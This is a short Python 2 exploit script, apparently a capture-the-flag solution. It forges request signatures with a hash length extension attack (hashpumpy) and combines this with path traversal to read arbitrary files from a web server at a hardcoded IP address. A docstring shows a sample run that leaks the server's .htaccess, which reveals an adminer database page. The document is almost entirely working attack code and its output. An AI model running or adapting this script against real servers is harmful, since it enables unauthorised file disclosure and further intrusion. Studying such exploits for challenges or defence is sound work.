import hashpumpy
import urllib2
import urllib

url = "http://178.62.34.76/getAttachment/"

origin_sig = "beb2e68c628653c72abcb388b078cfda"
origin_data = "file.txt"
key_length = 32

while 1:
	append_data = '?/'+raw_input("path : ")
	new_signature,new_data  = hashpumpy.hashpump(origin_sig,origin_data,append_data,key_length)
	print 'new signature : %s'%(new_signature)
	print 'new data : %s'%(new_data).encode('hex')
	req = urllib2.Request(url+urllib.quote_plus(urllib.quote_plus(new_data)))
	req.add_header('X-Signature',new_signature)
	res = urllib2.urlopen(req)
	print res.read()

'''
path : ../../.htaccess
new signature : 77a6762d005d965a0ee69202bd67ca28
new data : 66696c652e7478748000000000000000000000000000000040010000000000003f2f2e2e2f2e2e2f2e6874616363657373
RewriteEngine on

RewriteRule simple-php-captcha.php simple-php-captcha.php [L]

RewriteRule showInformation/(.+) /showInformation.php?informationID=$1 [L]
RewriteRule infoSubmit /informationSubmit.php [L]
RewriteRule notConfirmedInformation/(.+) /notConfirmedInformation.php?informationID=$1 [L]
RewriteRule getAttachment/(.+) /getAttachment.php?fileName=$1 [L]
RewriteRule dataSubmitted/(.+) /dataSubmitted.php [L]
RewriteRule adminer-4.3.1-en.php adminer-4.3.1-en.php [L]

#RewriteRule "searchData/(.+)" "http://gsa.dataStorage.domain/0/portalSearch/?searchURL=$1" [L]
#RewriteRule "API/(.+)" "http://gsa.API.domain/api/$1" [L]

RewriteCond %{REQUEST_FILENAME} !-d
RewriteCond %{REQUEST_FILENAME} !-f
RewriteRule . index.php [L]

RewriteCond %{THE_REQUEST} \.php[\ /?].*HTTP/ [NC]
RewriteRule ^.*$ index.php [L]
'''
